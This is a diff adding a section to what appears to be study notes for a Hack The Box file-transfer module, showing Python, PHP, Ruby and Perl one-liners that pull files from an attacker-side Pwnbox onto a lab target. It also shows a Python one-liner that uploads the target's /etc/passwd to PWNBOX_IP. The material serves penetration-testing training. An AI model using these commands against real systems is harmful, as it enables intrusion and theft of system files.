@@ -351,6 +351,96 @@ cscript.exe /nologo wget.vbs http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
 
 These are strongly monitored in many environments; their availability does not imply authorization to use them.
 
+### Hands-on workflow: code-based transfers
+
+The Section 4 optional exercise asks the learner to connect to the Linux target over SSH and practice code-based downloads and uploads with the Pwnbox.
+
+| Method | Direction | Runs on |
+|---|---|---|
+| Python, PHP, Ruby, or Perl download | Pwnbox → Linux target | Target |
+| Python `requests.post()` upload | Linux target → Pwnbox | Target |
+| Python `uploadserver` | Serves downloads and receives uploads | Pwnbox |
+
+Prepare a harmless test file and start the receiving server on Pwnbox:
+
+```bash
+mkdir -p /tmp/code-transfer
+cd /tmp/code-transfer
+echo "HTB code transfer practice" > section4-test.txt
+python3 -m uploadserver
+```
+
+The server exposes two relevant paths:
+
+```text
+Download: http://PWNBOX_IP:8000/section4-test.txt
+Upload:   http://PWNBOX_IP:8000/upload
+```
+
+Connect to the lab target:
+
+```bash
+ssh htb-student@TARGET_IP
+```
+
+Download with Python 3:
+
+```bash
+python3 -c 'import urllib.request;urllib.request.urlretrieve("http://PWNBOX_IP:8000/section4-test.txt","python-test.txt")'
+cat python-test.txt
+```
+
+- `python3 -c` runs the supplied Python code directly from the shell.
+- `urllib.request` provides the standard-library HTTP client.
+- `urlretrieve(source, destination)` downloads the first argument into the second.
+
+Download with PHP:
+
+```bash
+php -r '$file=file_get_contents("http://PWNBOX_IP:8000/section4-test.txt");file_put_contents("php-test.txt",$file);'
+cat php-test.txt
+```
+
+- `-r` runs PHP code directly from the command line.
+- `file_get_contents()` retrieves the remote content.
+- `file_put_contents()` saves that content locally.
+
+Download with Ruby:
+
+```bash
+ruby -e 'require "net/http";File.write("ruby-test.txt",Net::HTTP.get(URI.parse("http://PWNBOX_IP:8000/section4-test.txt")))'
+cat ruby-test.txt
+```
+
+Download with Perl:
+
+```bash
+perl -e 'use LWP::Simple;getstore("http://PWNBOX_IP:8000/section4-test.txt","perl-test.txt");'
+cat perl-test.txt
+```
+
+Not every target has all four interpreters or the required libraries. A missing runtime or module is a reason to try another language rather than install unnecessary software on the target.
+
+Upload a file from the target to Pwnbox using the exact Python pattern taught by HTB:
+
+```bash
+python3 -c 'import requests;requests.post("http://PWNBOX_IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+- `import requests` loads the third-party HTTP library.
+- `requests.post()` sends an HTTP POST request.
+- The URL ending in `/upload` selects `uploadserver`'s receiving endpoint.
+- `open("/etc/passwd","rb")` opens the source in binary-read mode.
+- `files={"files": ...}` sends it as a multipart file field named `files`.
+
+Confirm the upload on Pwnbox:
+
+```bash
+ls -l /tmp/code-transfer/passwd
+```
+
+For the optional exercise, one successful code-based download and one successful Python upload demonstrate both directions. Additional languages should be tested when present.
+
 ---
 
 ## 5. Miscellaneous transfer methods
